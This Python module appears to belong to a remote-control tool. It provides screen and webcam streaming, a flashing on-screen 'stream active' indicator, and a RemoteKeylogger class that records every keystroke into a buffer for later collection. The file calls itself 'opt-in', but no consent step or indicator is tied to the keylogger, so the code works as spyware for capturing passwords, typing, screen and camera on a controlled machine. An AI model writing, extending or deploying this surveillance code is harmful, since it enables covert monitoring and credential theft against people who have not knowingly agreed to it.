"""Opt-in screen, camera, visual indicators, and secure keylogger utilities."""

from __future__ import annotations

import os
import threading
import tkinter as tk
from typing import Optional

import cv2
import mss
import numpy as np
from pynput import keyboard


class VisualIndicator:
    """Tạo chỉ báo trực quan hiển thị trên màn hình máy bị điều khiển (Xanh lá: Livestream, Đỏ: Webcam)."""

    def __init__(self, color: str = "green", label_text: str = "STREAM ACTIVE") -> None:
        self.color = color
        self.label_text = label_text
        self._thread: Optional[threading.Thread] = None
        self._root: Optional[tk.Tk] = None
        self._running = False

    def start(self) -> None:
        if self._running:
            return
        self._running = True
        self._thread = threading.Thread(target=self._run_ui, daemon=True)
        self._thread.start()

    def _run_ui(self) -> None:
        try:
            self._root = tk.Tk()
            self._root.overrideredirect(True)
            self._root.attributes("-topmost", True)
            self._root.attributes("-alpha", 0.85)
            
            # Đặt ở góc trên bên phải màn hình
            screen_w = self._root.winfo_screenwidth()
            self._root.geometry(f"220x40+{screen_w - 240}+20")
            self._root.configure(bg=self.color)

            label = tk.Label(
                self._root,
                text=f"● {self.label_text}",
                fg="white",
                bg=self.color,
                font=("Arial", 10, "bold")
            )
            label.pack(expand=True, fill="both")

            # Hiệu ứng nhấp nháy chớp tắt
            def flash():
                if not self._running or not self._root:
                    return
                current_bg = self._root.cget("bg")
                next_bg = "#111111" if current_bg == self.color else self.color
                self._root.configure(bg=next_bg)
                label.configure(bg=next_bg)
                self._root.after(500, flash)

            self._root.after(500, flash)
            self._root.mainloop()
        except Exception:
            pass

    def stop(self) -> None:
        self._running = False
        if self._root:
            try:
                self._root.after(0, self._root.destroy)
            except Exception:
                pass


def capture_primary_screen_jpeg(
    jpeg_quality: int = 75, max_width: int = 1920
) -> bytes:
    """Capture one bounded-size screen snapshot encoded as JPEG."""
    try:
        with mss.mss() as screen_capture:
            primary_monitor = screen_capture.monitors[1]
            image = screen_capture.grab(primary_monitor)
            # MSS returns BGRA; OpenCV encodes the first three channels as BGR.
            frame = np.asarray(image, dtype=np.uint8)[:, :, :3]
            return _encode_jpeg(frame, jpeg_quality, max_width, "screen snapshot")
    except mss.exception.ScreenShotError as exc:
        raise RuntimeError(f"Unable to capture primary screen: {exc}") from exc


def capture_camera_frame(camera_index: int = 0):
    """Capture one warmed-up camera frame, trying safe backend fallbacks."""
    camera, frame = _open_working_camera(camera_index)
    try:
        return frame
    finally:
        camera.release()


def capture_camera_jpeg(
    camera_index: int = 0, jpeg_quality: int = 75, max_width: int = 1920
) -> bytes:
    """Capture one bounded-size, warmed-up camera snapshot as JPEG."""
    frame = capture_camera_frame(camera_index)
    return _encode_jpeg(frame, jpeg_quality, max_width, "webcam snapshot")


def _camera_backends() -> list[int]:
    if os.name == "nt":
        candidates = [cv2.CAP_DSHOW, cv2.CAP_MSMF, cv2.CAP_ANY]
    else:
        candidates = [cv2.CAP_ANY]
    # Some OpenCV builds map multiple constants to the same value.
    return list(dict.fromkeys(candidates))


def _read_camera_frame(camera, attempts: int = 10):
    """Read through startup frames until the device returns a usable image."""
    for _ in range(max(1, attempts)):
        success, frame = camera.read()
        if success and frame is not None:
            return frame
    return None


def _open_working_camera(camera_index: int, fps: float = 30):
    """Return the first backend that both opens and produces a real frame."""
    for backend in _camera_backends():
        camera = cv2.VideoCapture(camera_index, backend)
        if not camera.isOpened():
            camera.release()
            continue

        camera.set(cv2.CAP_PROP_BUFFERSIZE, 1)
        camera.set(cv2.CAP_PROP_FPS, max(float(fps), 1.0))
        frame = _read_camera_frame(camera)
        if frame is not None:
            return camera, frame
        camera.release()

    raise RuntimeError(
        f"Unable to open camera {camera_index} with a backend that returns frames"
    )


class ScreenStreamCapture:
    """Long-lived, JPEG-encoded screen capture for high-frame-rate streams.

    An instance must be created, read, and closed on the same worker thread
    because MSS stores platform capture handles in thread-local storage.
    """

    def __init__(self, jpeg_quality: int = 65, max_width: int = 1280) -> None:
        self.jpeg_quality = max(1, min(int(jpeg_quality), 100))
        self.max_width = max(0, int(max_width))
        self._capture = mss.mss()
        self._monitor = self._capture.monitors[1]

    def read_jpeg(self) -> bytes:
        image = self._capture.grab(self._monitor)
        # MSS returns BGRA; OpenCV's JPEG encoder expects BGR.
        frame = np.asarray(image, dtype=np.uint8)[:, :, :3]
        frame = _resize_to_max_width(frame, self.max_width)
        success, encoded = cv2.imencode(
            ".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, self.jpeg_quality]
        )
        if not success:
            raise RuntimeError("Failed to encode screen frame")
        return encoded.tobytes()

    def close(self) -> None:
        self._capture.close()


class CameraStreamCapture:
    """Long-lived webcam capture; avoids reopening the device every frame."""

    def __init__(
        self,
        camera_index: int = 0,
        fps: float = 60,
        jpeg_quality: int = 70,
        max_width: int = 1280,
    ) -> None:
        self.jpeg_quality = max(1, min(int(jpeg_quality), 100))
        self.max_width = max(0, int(max_width))
        self._camera, self._pending_frame = _open_working_camera(camera_index, fps)

    def read_jpeg(self) -> bytes:
        if self._pending_frame is not None:
            frame = self._pending_frame
            self._pending_frame = None
        else:
            frame = _read_camera_frame(self._camera, attempts=1)
            if frame is None:
                raise RuntimeError("Camera did not return a frame")
        return _encode_jpeg(frame, self.jpeg_quality, self.max_width, "webcam frame")

    def close(self) -> None:
        self._camera.release()


def _resize_to_max_width(frame: np.ndarray, max_width: int) -> np.ndarray:
    if max_width <= 0 or frame.shape[1] <= max_width:
        return frame
    scale = max_width / frame.shape[1]
    target_size = (max_width, max(1, round(frame.shape[0] * scale)))
    return cv2.resize(frame, target_size, interpolation=cv2.INTER_AREA)


def _encode_jpeg(
    frame: np.ndarray, jpeg_quality: int, max_width: int, label: str
) -> bytes:
    quality = max(1, min(int(jpeg_quality), 100))
    resized = _resize_to_max_width(frame, max(0, int(max_width)))
    success, encoded = cv2.imencode(
        ".jpg", resized, [cv2.IMWRITE_JPEG_QUALITY, quality]
    )
    if not success:
        raise RuntimeError(f"Failed to encode {label}")
    return encoded.tobytes()


class RemoteKeylogger:
    """Thread-safe keylogger thu thập phím bấm."""

    def __init__(self) -> None:
        self._buffer: list[str] = []
        self._lock = threading.Lock()
        self._listener: keyboard.Listener | None = None
        self._is_running = False

    def _on_press(self, key: keyboard.Key | keyboard.KeyCode | None) -> None:
        with self._lock:
            try:
                if isinstance(key, keyboard.KeyCode) and key.char:
                    self._buffer.append(key.char)
                elif key == keyboard.Key.space:
                    self._buffer.append(" ")
                elif key == keyboard.Key.enter:
                    self._buffer.append("\n[ENTER]\n")
                elif key == keyboard.Key.backspace:
                    if self._buffer:
                        self._buffer.pop()
                elif key == keyboard.Key.tab:
                    self._buffer.append("\t")
                else:
                    self._buffer.append(f"[{key.name.upper()}]")
            except Exception:
                pass

    def start(self) -> None:
        with self._lock:
            if self._is_running:
                return
            self._buffer.clear()
            self._listener = keyboard.Listener(on_press=self._on_press)
            self._listener.start()
            self._is_running = True

    def get_and_clear(self) -> str:
        with self._lock:
            data = "".join(self._buffer)
            self._buffer.clear()
            return data

    def stop(self) -> None:
        with self._lock:
            if self._is_running and self._listener:
                self._listener.stop()
                self._listener = None
            self._is_running = False
            self._buffer.clear()

    @property
    def is_running(self) -> bool:
        with self._lock:
            return self._is_running
